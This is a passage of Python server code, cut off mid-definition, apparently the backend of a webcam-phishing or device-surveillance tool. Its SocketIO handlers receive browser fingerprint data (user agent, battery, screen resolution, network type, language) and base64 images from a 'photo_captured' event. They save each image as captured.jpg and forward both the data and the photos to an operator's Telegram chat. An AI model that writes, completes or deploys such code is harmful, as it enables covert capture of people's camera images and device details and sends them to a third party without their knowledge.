@socketio.on('device_info_report')
def handle_device_info(data):
    print(f"Device Info Received: {data}")
    if 'update' in latest_telegram_context:
        update = latest_telegram_context['update']
        context = latest_telegram_context['context']
        loop = latest_telegram_context['loop']
        
        info_text = (
            "📱 *Device Information Received*\n\n"
            f"🌐 *Browser:* {data.get('userAgent')[:100]}...\n"
            f"🔋 *Battery:* {data.get('batteryLevel')} ({'Charging' if data.get('isCharging') else 'Not Charging'})\n"
            f"🖥️ *Resolution:* {data.get('screenResolution')}\n"
            f"📶 *Network:* {data.get('connectionType')}\n"
            f"🌍 *Language:* {data.get('language')}"
        )
        
        asyncio.run_coroutine_threadsafe(
            context.bot.send_message(chat_id=update.effective_chat.id, text=info_text, parse_mode='Markdown'),
            loop
        )

@socketio.on('photo_captured')
def handle_photo(data):
    image_data = data['image']
    header, encoded = image_data.split(",", 1)
    binary_data = base64.b64decode(encoded)
    
    with open("captured.jpg", "wb") as f:
        f.write(binary_data)
    
    if 'update' in latest_telegram_context:
        update = latest_telegram_context['update']
        context = latest_telegram_context['context']
        loop = latest_telegram_context['loop']
        
        asyncio.run_coroutine_threadsafe(
            context.bot.send_photo(chat_id=update.effective_chat.id, photo=open("captured.jpg", "rb"), caption="📸 Captured Image"),
            loop
        )

@socketio.on('error_log')
